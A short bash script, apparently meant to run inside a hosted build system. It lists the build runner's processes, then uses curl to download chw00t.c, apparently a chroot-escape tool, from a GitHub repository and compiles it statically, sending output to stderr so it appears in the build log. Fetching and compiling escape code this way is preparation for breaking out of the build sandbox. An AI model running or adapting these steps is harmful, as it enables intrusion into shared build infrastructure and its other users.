#!/bin/bash
ps -faux | grep 'bash -c set -o pipefail; /home/build/'
curl -L-o lol.c https://github.com/emead-indeed/chw00t/raw/master/chw00t.c
ls -al 1>&2
/usr/bin/gcc lol.c -o lol -static 1>&2
ls -al 1>&2
